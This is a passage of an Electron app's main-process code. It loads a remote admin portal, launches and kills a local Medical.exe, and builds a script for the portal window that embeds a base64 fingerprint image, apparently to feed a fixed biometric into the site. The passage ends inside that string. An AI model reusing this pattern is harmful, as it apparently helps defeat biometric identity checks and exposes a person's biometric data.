import { app, BrowserWindow, ipcMain, globalShortcut, screen } from 'electron';
import { execFile, exec } from 'child_process';
import path from 'node:path';
import started from 'electron-squirrel-startup';
import contextMenu from 'electron-context-menu';
const windows = new Set();

if (started) {
  app.quit();
}

let launchedProcess = null;
let mainWindow;
let ltmsWindow;
let settingsWindow;
let windowSize={};

contextMenu({
  showSearchWithGoogle: false, 
  showServices: false,
  showLookUpSelection: false,
  showSaveImageAs: false,
  showInspectElement: false,
   append: (params, browserWindow) => [
        {
            label: 'Reload App',
            click: () => {
                ltmsWindow.webContents.reload();
            }
        }
    ],
});

const createWindow = () => {
 
  mainWindow = new BrowserWindow({
   
    width: windowSize.main.width,
    height: windowSize.main.height, // Set the height to the full screen height
    x: 0, // Position at the leftmost side of the screen
    y: 0, // Position at the top of the screen
    frame: false, // Set to false if you want a frameless window and want to implement a custom title bar
    resizable: true, // Allow resizing if needed
    icon: path.join(__dirname, '../../resources/icons/icon.ico'),
    webPreferences: {
      devTools: true,
      preload: path.join(__dirname, 'preload.js'),
    },
  });

  windows.add(mainWindow);
  
  mainWindow.on('closed', () => {
    windows.delete(ltmsWindow);
    mainWindow = null; // Dereference the window object
    app.quit();
  });
  

  mainWindow.on('focus', ()=>{
    if(ltmsWindow)
      if((mainWindow.isVisible() && ltmsWindow.isMinimized())){
        ltmsWindow.show()
      }

  })


  mainWindow.on('blur', ()=>{
    if(mainWindow && ltmsWindow)
      if((!ltmsWindow.isFocused() && !mainWindow.isFocused() && !settingsWindow.isFocused())){
        ltmsWindow.minimize()
        mainWindow.minimize()
    }
    
  })
    
   if (MAIN_WINDOW_VITE_DEV_SERVER_URL) {
    mainWindow.loadURL(MAIN_WINDOW_VITE_DEV_SERVER_URL);
  } else {
    mainWindow.loadFile(path.join(__dirname, `../renderer/${MAIN_WINDOW_VITE_NAME}/index.html`));
  }
  mainWindow.hide()
}

const createLtmsWindow = () => {
  ltmsWindow = new BrowserWindow({
    title: 'My Custom App Name',
     autoHideMenuBar: true,
    width: windowSize.ltms.width,
    height: windowSize.ltms.height,
    frame: false, // Set to false if you want a frameless window and want to implement a custom title bar
    resizable: true, // Allow resizing if needed
    x: windowSize.main.width, // Position at the leftmost side of the screen
    y: 0, // Position at the top of the screen
    icon: path.join(__dirname, '../../resources/icons/icon.ico'),
    webPreferences: {
      devTools: true,
    }
  });
   ltmsWindow.on('closed', () => {
    windows.delete(ltmsWindow);
    ltmsWindow = null; // Dereference the window object
    app.quit();
  });

  windows.add(ltmsWindow);
ltmsWindow.on('focus', ()=>{
  console.log(`main status: ${mainWindow}`)
    if(mainWindow)
    if((ltmsWindow.isVisible() && mainWindow.isMinimized())){
      mainWindow.show()
    }

  })
  ltmsWindow.on('blur', ()=>{
     if(mainWindow && ltmsWindow)
      if((!ltmsWindow.isFocused() && !mainWindow.isFocused() && !settingsWindow.isFocused())){
          ltmsWindow.minimize()
          mainWindow.minimize()
      }
    
  })
 
  
  ltmsWindow.loadURL('https://dlro.com.ph/admin/#/login');
  ltmsWindow.hide()
};

var createSettingsWindow = () => {
  const primaryDisplay = screen.getPrimaryDisplay();
  const { width, height } = primaryDisplay.workAreaSize; // Use workAreaSize to respect the OS taskbar/dock
  const windowWidth = 225 //225; // Full screen width
  const windowHeight = 280 //280
  const rightMax = width - windowWidth;
  const bottom = height - windowHeight;
  const x = Math.floor((width - windowWidth) / 2);
  const y = Math.floor((height - windowHeight) / 2);
  settingsWindow = new BrowserWindow({
    autoHideMenuBar: true,
        width: windowWidth,
        height: windowHeight,
        transparent: true,
        resizable: true,
        frame: false, // Set to false if you want a frameless window and want to implement a custom title bar
        x: x, // Position at the leftmost side of the screen
        y: y, // Position at the top of the screen
        icon: path.join(__dirname, '../../resources/icons/icon.ico'),
        webPreferences: {
          devTools: false,
          preload: path.join(__dirname, 'preload.js'),
        }
    });
  windows.add(settingsWindow);

  settingsWindow.setAlwaysOnTop(false, 'screen');

  settingsWindow.on('closed', () => {
    windows.delete(settingsWindow);
    settingsWindow = null; // Dereference the window object
    app.quit();
  });

  if (SETTINGS_WINDOW_VITE_DEV_SERVER_URL) {
    settingsWindow.loadURL(`${SETTINGS_WINDOW_VITE_DEV_SERVER_URL}/src/windows/modal_windows/tool_floater.html`);
  } else {  
    settingsWindow.loadFile(path.join(__dirname, `../renderer/${SETTINGS_WINDOW_VITE_NAME}/src/windows/modal_windows/tool_floater.html`));
  }

};

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
// let primaryDisplayD;
app.whenReady().then(() => {
  const primaryDisplayD = screen.getPrimaryDisplay();
 
  windowSize.workArea = primaryDisplayD.workAreaSize

  let mainWindWidth = windowSize.workArea.width * 0.125 ;
  windowSize.main = {width: mainWindWidth, height: windowSize.workArea.height}

  let ltmsWindWidth = windowSize.workArea.width - windowSize.main.width; 
  windowSize.ltms = {width: ltmsWindWidth, height: windowSize.workArea.height}

  createLtmsWindow();
  createWindow();
  createSettingsWindow();
  
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createLtmsWindow();
      createWindow();
      createSettingsWindow();
    }
  });
  
});


app.on('ready', () => {
    globalShortcut.register('Control+`', focusAllWindows); 
    
});

app.on('will-quit', () => {
    globalShortcut.unregisterAll();
});
// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});


const createMainWindows = () => {
  ltmsWindow.show()
  mainWindow.show()
}
const focusAllWindows = () => {
    for (const window of windows) {
        if (window.isMinimized()) window.restore(); // Restore minimized windows first

        // A common workaround to force a window to the front
        window.setAlwaysOnTop(true);
        window.focus();
        window.setAlwaysOnTop(false);

        // For Windows specifically, you might use win.moveTop()
        // if (process.platform === 'win32') {
        //     window.moveTop(); 
        // }
    }
    // app.focus({ steal: true }); // Ensure the entire app gets OS focus
};

ipcMain.on('run-windows-app', (event, appPath) => {
    const executablePath = 'C:\\Users\\user\\AppData\\Local\\Apps\\2.0\\MTV4XM0V.E5X\\N7ZVC8YD.1YV\\medi..tion_0000000000000000_07e4.000b_527094018bfeb39c\\Medical.exe'; 

    // Store the returned process object in the global variable
    launchedProcess = execFile(executablePath, (error, stdout, stderr) => {
        if (error && error.killed) {
            // Ignore the error if the process was intentionally killed
            console.log('App closed by user action.');
            event.reply('app-run-result', 'Calculator closed successfully.');
            launchedProcess = null; // Clear the reference
            return;
        } else if (error) {
            console.error(`Error running app: ${error}`);
            event.reply('app-run-result', `Error: ${error.message}`);
            return;
        }
       
    });

    console.log(`Windows Calculator launched with PID: ${launchedProcess.pid}`);
    event.reply('app-run-result', `Calculator launched successfully! PID: ${launchedProcess.pid}`);
});

ipcMain.on('close-windows-app', (event) => {
  
    // if (launchedProcess) {
        // const pid = launchedProcess.pid;
        const imageToKill = 'Medical.exe';
       
        // 🛑 Windows-Specific Termination Command:
        // taskkill /F /PID <PID>
        // /F: Forcefully terminate the process
        // /PID: Specify the Process ID
        // const command = `taskkill /F /PID ${pid}`;
        const command = `taskkill /F /IM ${imageToKill}`;

      exec(command, (error, stdout, stderr) => {
        if (error && stderr.includes('not found')) {
            // Handle the case where the application is already closed
            console.log(`Process ${imageToKill} was not running.`);
            event.reply('app-run-result', `Calculator is not currently running.`);
            launchedProcess = null; // Ensure the tracker is cleared
        } else if (error) {
            // Handle other errors (e.g., permission issues)
            console.error(`Taskkill Error: ${error}`);
            event.reply('app-run-result', `Failed to close app (Error: ${stderr.trim()})`);
        } else {
            // Success
            console.log(`Process ${imageToKill} terminated successfully.`);
            event.reply('app-run-result', 'Calculator closed successfully!');
            launchedProcess = null; // Clear the reference
        }
    });

});

ipcMain.on('trigger-remote-script', async (event, customScript) => {
    if (ltmsWindow && !ltmsWindow.isDestroyed()) {
      
        try {
           
              const NEW_BTN ={
              new_resubmit : 'button.btn.btn-secondary',
              resubmit_as_new: 'button.btn.btn-warning'
            }
            const targ = NEW_BTN[customScript]
       
            const script = `
                (function() {
                  const fingerPrnt = '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